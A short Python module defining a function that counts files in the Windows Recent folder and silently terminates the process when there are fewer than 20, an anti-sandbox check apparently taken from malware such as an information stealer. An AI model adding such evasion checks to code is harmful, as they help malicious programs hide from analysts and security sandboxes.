import ctypes
import os

from main import error_handler


async def check_recent_files(self) -> bool:
    try:
        recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
        if len(os.listdir(recent_files_folder)) < 20:
            ctypes.windll.kernel32.ExitProcess(0)
    except Exception as e:
        error_handler(f"check recent files error - {str(e)}")
